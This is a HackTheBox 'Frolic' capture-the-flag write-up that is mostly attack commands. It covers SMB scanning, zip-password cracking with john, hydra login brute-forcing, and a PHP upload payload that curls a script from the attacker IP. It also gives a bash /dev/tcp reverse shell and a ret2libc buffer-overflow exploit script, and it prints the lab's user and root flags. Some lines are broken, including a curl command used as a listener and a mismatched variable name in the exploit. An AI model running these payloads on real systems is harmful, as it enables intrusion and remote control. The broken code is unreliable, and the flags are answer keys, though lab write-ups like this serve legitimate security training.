# HackTheBox Frolic Writeup

![date](https://img.shields.io/badge/date-03.28.2019-brightgreen.svg)  
![web category](https://img.shields.io/badge/category-web-lightgrey.svg)
![score](https://img.shields.io/badge/score-0-blue.svg)
![solves](https://img.shields.io/badge/solves-3144-brightgreen.svg)

## Detailed Solution

### Smb scan.
      smbmap -H 10.10.10.111
      
### Check if target port is opened.      
      nc -zv 10.10.10.111 1880

### Decryption      
!(Ook language decode)[https://www.dcode.fr/ook-language]      
Then you get **Nothing here check /asdiSIAJJ0QWE9JAS**

Check out http://10.10.10.111/asdiSIAJJ0QWE9JAS

Then you get base64 code.

Decrypt it!

    cat b64encoded | base64 -d > temp
    file temp
    
Then you get a zip file encrypted with password.
    zipinfo temp
    zip2john temp > tmep.zip.hash
    john --wordlist=/usr/share/wordlists/rockyou.txt temp.zip.hash
Then you get password of this zip file

    unzip temp

Now you get a **index.php** file .
    cat index.php | xxd -r -p > index.php.b64
    base64 -d index.php.b64 > index.php

    for i in $(cat index1.php.b64); do echo -n $i | base64 -d; done
    
!(Brainfuck language decode)[https://www.dcode.fr/brainfuck-language]

#### Use hydra to brute force the login of target smb server.
    hydra -l admin -P password.txt smb://10.10.10.111

## Get Shell    
    
### Write a Upload form using file upload exploitation.    
    ---------------  Upload Form ---------------------
    <?php system('curl 10.10.16.27/Jasondidit.sh'); ?> 
    -----------------  End Form ----------------------
    
    ---------------  Shell Content --------------------
    bash -c 'bash -i >& /dev/tcp/10.10.16.27/9002 0>&1'
    -----------------  End Shell ----------------------
    
    > curl -lvnp 9002

Then you get a reverse shell!
    
## Post Exploitation

### Complete shell function using Python.
    python -c 'import pty;pty.spawn("/bin/bash")'
    stty raw -echo
    fg
    export TERM=xterm
    
    
    
    
    
### Reverse Engineering 
#### gdb-peda 
    gdb rop
    r [string]
    r Hello, world
    pattern_create 100
    r [pattern_created string]

Buffer Overflow    
    pattern_offset 0x41474141 (SIGSEGV error)
    python -c 'print "A"*[pattern_offset]'
    r [pattern_created_sting]d3adc0d3
    EIP -> 'd3ad'
    ESP -> 'c0d3'
    checksec
    CANARY
    FORTIFY
    NX
    PIE

    if randomize_va_space 2 PIE <- ENABLED
    else 1 PIE <- PIE
    else 0 PIE <- DISABLED

    RELRO

Check out Ippsec Bitterman(October) to get full understanding of rop attack.

    cat /proc/sys/kernel/randomize_va_space (PIE bit)
    uname -a
### Python Shellcode

    ldd rop (get libc address)
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i system (get system@@GLIBC_2.0)
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i exit (get exit@@GLIBC_2.0)
    strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh (get sh address)


    touch exploit.py

    #!/usr/bin/python
    #exploit.py
    import  struct

    junk = "A" * 52
    libc = [libc address]
    system = struct.pack('<I', libc + [system address])
    exit = struct.pack('<I', libc + [exit address])
    bins = struct.pack('<i', libc + [sh address])
    
    payload = junk + system + exit + binsh 
    print payload

    cat exploit.py | base64 -w 0

    cd /dev/shm
    box > echo -n [shellcode] | base64 -d > exploit.py

Change to previous working directory
    cd - 
    ./rop $(python /dev/shm/exploit.py)

## Bonus Time

  grep -a 'Usage: program <message>' -B10 -A10 /dev/sda1
  strings /dev/sda1 | grep 'Usage: program <message>'
   

## Flags    
User Flag:  2ab95909cf509f85a6f476b59a0c2fe0   
Root Flat:  85d3fdf03f969892538ba9a731826222
